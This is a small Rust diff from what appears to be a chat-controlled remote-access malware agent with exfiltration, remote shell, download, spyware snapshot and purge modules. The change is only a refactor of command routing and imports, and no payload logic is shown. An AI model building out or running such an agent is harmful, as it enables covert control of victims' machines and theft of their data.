@@ -1,8 +1,7 @@
 use crate::{
-    commands::{handle_command},
     commands::exfiltration::exfiltrate::handle_exfiltrate,
-    commands::shell::{exit, session::session_handler, download::download_handler},
-    commands::snapshot::snapshot_handler,
+    commands::shell::{exit, session::{session_handler, command_handler}, download::download_handler},
+    commands::spyware::snapshot::snapshot_handler,
     commands::misc::{info, purge::purge_handler},
     register_commands,
     send_agent_check_in,
@@ -35,7 +34,7 @@ impl EventHandler for MainHandler {
 
         if let Some(channel) = agent.get_session_channel() {
             if msg.channel_id == *channel {
-                handle_command(&ctx, &msg).await.expect("Failed to handle command");
+                command_handler(&ctx, &msg).await.expect("Failed to handle command");
             }
         }
     }
